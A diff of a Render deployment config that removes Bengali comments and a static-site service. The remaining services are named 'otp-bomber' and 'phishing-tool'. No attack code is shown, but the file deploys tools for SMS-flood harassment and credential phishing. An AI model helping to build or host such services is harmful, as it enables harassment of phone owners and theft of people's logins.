@@ -1,10 +1,10 @@
 services:
   - type: web
-    name: otp-bomber                   # Render-এ সার্ভিসের নাম
+    name: otp-bomber
     runtime: python
-    rootDir: backend                   # 👈 ফোল্ডারের নাম দিন
+    rootDir: backend
     buildCommand: pip install -r requirements.txt
-    startCommand: gunicorn app:app     # এখানে startCommand পরিবর্তন করতে পারেন
+    startCommand: gunicorn app:app
 
   - type: web
     name: phishing-tool
@@ -12,9 +12,3 @@ services:
     rootDir: phishing
     buildCommand: pip install -r requirements.txt
     startCommand: gunicorn phis:app
-
-  - type: web
-    name: my-static-site
-    runtime: static
-    rootDir: frontend
-    publish: ./                        # স্ট্যাটিক ফাইল যেখানে আছে
